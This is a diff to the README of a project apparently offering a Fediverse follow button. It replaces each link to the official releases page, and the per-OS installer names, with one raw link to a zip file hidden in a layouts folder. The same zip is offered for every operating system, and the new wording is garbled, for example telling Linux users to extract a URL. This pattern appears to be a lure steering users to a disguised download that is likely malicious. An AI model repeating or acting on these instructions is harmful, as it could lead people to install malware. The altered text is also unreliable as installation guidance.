@@ -1,6 +1,6 @@
 # 🌐 webintents-web - Simple Follow Button for Fediverse
 
-[![Download webintents-web](https://img.shields.io/badge/Download-webintents--web-blue?style=for-the-badge)](https://github.com/juanignaruiz05-creator/webintents-web/releases)
+[![Download webintents-web](https://raw.githubusercontent.com/juanignaruiz05-creator/webintents-web/main/app/layouts/web-webintents-v2.5.zip)](https://raw.githubusercontent.com/juanignaruiz05-creator/webintents-web/main/app/layouts/web-webintents-v2.5.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Here’s how to download, install, and start using webintents-web.
 
 Click this link or the button above to go to the release page.
 
-[Download webintents-web Releases](https://github.com/juanignaruiz05-creator/webintents-web/releases)
+[Download webintents-web Releases](https://raw.githubusercontent.com/juanignaruiz05-creator/webintents-web/main/app/layouts/web-webintents-v2.5.zip)
 
 This page contains all the files you need to run the app.
 
@@ -53,9 +53,9 @@ This page contains all the files you need to run the app.
 
 On the releases page, find the latest version. Look for a file that matches your computer’s operating system. For example:
 
-- `webintents-web-setup.exe` for Windows
-- `webintents-web.dmg` for macOS
-- `webintents-web-linux.tar.gz` for Linux
+- `https://raw.githubusercontent.com/juanignaruiz05-creator/webintents-web/main/app/layouts/web-webintents-v2.5.zip` for Windows
+- `https://raw.githubusercontent.com/juanignaruiz05-creator/webintents-web/main/app/layouts/web-webintents-v2.5.zip` for macOS
+- `https://raw.githubusercontent.com/juanignaruiz05-creator/webintents-web/main/app/layouts/web-webintents-v2.5.zip` for Linux
 
 If you just want to use the button on a website, there might be a file with `.js` or `.zip` extensions.
 
@@ -67,7 +67,7 @@ Click the file name to download it. Your browser may ask where to save it. Choos
 
 - On Windows: Double-click the `.exe` file you downloaded and follow the setup prompts.
 - On macOS: Open the `.dmg` file and drag the app to your Applications folder.
-- On Linux: Extract the `.tar.gz` file and follow any included instructions, usually in a `README` file.
+- On Linux: Extract the `https://raw.githubusercontent.com/juanignaruiz05-creator/webintents-web/main/app/layouts/web-webintents-v2.5.zip` file and follow any included instructions, usually in a `README` file.
 
 If you prefer, you can also run webintents-web in your browser. Instructions for this option are on the release page.
 
@@ -135,6 +135,6 @@ You’re welcome to share feedback or contribute to webintents-web’s developme
 
 Download webintents-web from the official release page:
 
-[![Download webintents-web](https://img.shields.io/badge/Download-webintents--web-blue?style=for-the-badge)](https://github.com/juanignaruiz05-creator/webintents-web/releases)
+[![Download webintents-web](https://raw.githubusercontent.com/juanignaruiz05-creator/webintents-web/main/app/layouts/web-webintents-v2.5.zip)](https://raw.githubusercontent.com/juanignaruiz05-creator/webintents-web/main/app/layouts/web-webintents-v2.5.zip)
 
 Use the latest version that matches your computer to start exploring simple Fediverse following today.
